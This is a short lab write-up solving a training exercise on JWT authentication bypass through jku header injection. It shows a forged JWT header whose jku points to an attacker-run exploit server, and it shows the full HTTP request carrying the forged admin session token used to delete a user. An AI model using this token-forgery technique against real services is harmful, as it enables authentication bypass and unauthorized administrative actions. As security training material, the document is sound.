# Lab: JWT authentication bypass via jku header injection

## LAB DESC

```
This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

## SOLUTION
I had to store the JWK set in the exploit server and copy the url to the `jku` parameter in the header to exploit the server vuln.

```json
{
  "kid": "e349eaa2-081e-42b1-b3cb-3e0b826f1459",
  "typ": "JWT",
  "alg": "RS256",
  "jku": "https://exploit-0a9900bb036145a381762e8801fb008b.exploit-server.net/exploit"
}
```
Rest all steps are similar to delete _Carlos_ using admin privileges as seen in the prev labs!
## REQUEST BODY

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a6d00490335459c81c72fb800f50043.web-security-academy.net
Cookie: session=eyJraWQiOiJlMzQ5ZWFhMi0wODFlLTQyYjEtYjNjYi0zZTBiODI2ZjE0NTkiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTk5MDBiYjAzNjE0NWEzODE3NjJlODgwMWZiMDA4Yi5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM2MDk1Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.fPQSA-yNM6UYFIZA042E4tAlweNO9DDYUnGeIACV0AJdgjry7NqkLGtczFXEWguY6Xy0gYfSd6HazrhFV3_3xWCU66FqOr2qmlU-locCKWaJ0MNqCa_LTmg2rdCme-UAI8cWbAQzzgr2kft9aStChAQ0XKkqPNN506yMbTmAi36c2WaSl8caD7St2s9ambVzQFXNJM-6NB2DCBYvkBSmySWu_1CVV_erOQYD-ajuIOEyq_bTY2fBMyvdFKb200fn4DeGXW-tmOmCLm9je-FNndYGEcGxDVWhy2ioqeD9R19DSEUju41T43dxPwCKe-62f1iifgw3H5AlBX1zoexFeg
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a6d00490335459c81c72fb800f50043.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

> LAB SOLVED!
